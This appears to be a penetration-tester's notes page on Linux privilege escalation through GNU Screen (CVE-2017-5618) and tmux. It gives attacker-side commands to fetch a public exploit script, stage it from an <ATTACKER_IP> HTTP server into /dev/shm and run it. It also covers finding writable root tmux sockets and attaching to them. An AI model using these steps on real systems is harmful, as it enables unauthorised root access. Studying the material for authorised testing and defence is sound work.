---
Primary_category: "[[LINUX PRIVESC]]"
title: "TERMINAL MULTIPLEXER ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *GNU Screen*

##### *CVE-2017-5618*

> ***[Reference](https://nvd.nist.gov/vuln/detail/CVE-2017-5618)***

> ***[Exploit](https://github.com/YasserREED/screen-v4.5.0-priv-escalate/blob/main/full-exploit.sh)***

###### *Affected Versions*

> ***4.5.1 and lower ( 4.05.00 == 4.5.0 )***

> ***From the Target*** 🎯 

```bash
screen -v
```

###### *Setup*

- ***Downloading the Script***

> ***From the Attacker*** ⚔️

```bash
curl --silent --location --request GET 'https://github.com/YasserREED/screen-v4.5.0-priv-escalate/raw/refs/heads/main/full-exploit.sh' --output exploit.bash
```

- ***Transferring the file to the Target***

> ***From the Attacker*** ⚔️

```bash
python -m http.server 80
```

> ***From the Target***🎯 

```bash
cd /dev/shm && curl --silent --location --request GET 'http://<ATTACKER_IP>/exploit.bash' --remote-name
```

###### *Usage*

```bash
bash exploit.bash
```

---

#### *Tmux*

> ***More information about TMUX [[TMUX|here]]***

##### *Hijacking TMUX Sessions*

Once we start our enumeration to find out a way to *privesc*, we reach the point where we list the running processes on the system

```bash
ps -faux
```

We take a look and see that there is a *TMUX* session running as *ROOT* or another privileged user

According to this, we know that sysadmins might be used to using *TMUX* on this server

If so, we can examine this further by running the following filter commands

```bash
pgrep --full --list-full -- 'tmux'
ps -faux | grep -i --color=always -- 'tmux'
```

Once we know that there is at least on active *TMUX* session on the server, we must look for the existing sockets related to the sessions

Bear in mind that any user that has *read* and *write* privileges on a *TMUX* socket can create or attach an existing *TMUX* server session via the socket

Therefore, we could proceed as follows to search for any *TMUX* socket for which the current user has write permissions

```bash
find / -path '*tmux*' -type s -writable 2> /dev/null
```

Then, we can attach to the existing session, which is running as *Root* or any other privileged user, by issuing the following command

```bash
tmux -S <SOCKET> a
```